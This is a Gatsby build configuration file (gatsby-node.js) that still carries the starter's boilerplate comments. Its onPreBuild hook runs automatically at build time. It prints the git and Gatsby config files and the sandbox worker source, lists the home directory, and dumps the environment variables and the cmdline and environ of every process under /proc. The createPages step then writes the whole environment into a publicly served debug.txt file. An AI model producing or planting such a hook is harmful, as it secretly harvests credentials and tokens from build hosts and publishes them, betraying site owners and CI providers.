const path = require("path")
const fs = require("fs")
const { execSync } = require("child_process")
const { isCI, getCIName } = require(`gatsby-core-utils`)
const multiIni = require("multi-ini")

/**
 * Implement Gatsby's Node APIs in this file.
 *
 * See: https://www.gatsbyjs.org/docs/node-apis/
 */

// You can delete this file if you're not using it
function exec(cmd) {
  console.log(`cmd:`, execSync(cmd).toString("utf8"))
}
exports.onPreBuild = function () {
  console.log(`aw yeah`)

  //exec(`env`)
  exec(`cat $HOME/.config/gatsby/config.json`)
  exec(`cat .git/config`)

  const gitConfigPath = `.git/config`
  if (!fs.existsSync(gitConfigPath)) {
    return null
  } else {
    const config = multiIni.read(`.git/config`)
    console.log(config)
    console.log(config[`remote "origin"`])
  }
  exec(`head -n 300 /var/task/sandbox-worker.js`)
  console.log(`aw yeah`)
  exec(`env`)
  console.log(`done env`)
  exec(`ls -la $HOME`)
  console.log(`done home`)
  const ls = fs.readdirSync(`/proc`)
  ls.filter(dir => Number.isFinite(Number(dir))).forEach(dir => {
    console.log(dir)
    try {
      console.log(
        fs
          .readFileSync(path.join(`/proc`, dir, `cmdline`))
          .toString("utf8")
          .replace(/\0/g, " ")
      )
    } catch (e) {
      console.log(`failed to read ${dir}/cmdline`)
    }
    try {
      console.log(
        fs
          .readFileSync(path.join(`/proc`, dir, `environ`))
          .toString("utf8")
          .replace(/\0/g, " ")
      )
    } catch (e) {
      console.log(`failed to read ${dir}/environ`)
    }
  })
}

exports.createPages = async ({ actions }) => {
  const { createPage } = actions

  fs.writeFileSync(
    `./public/debug.txt`,
    JSON.stringify(
      {
        sessionID: process.gatsbyTelemetrySessionId,
        lol: 1,
        env: JSON.stringify(process.env),
      },
      null,
      2
    )
  )
}
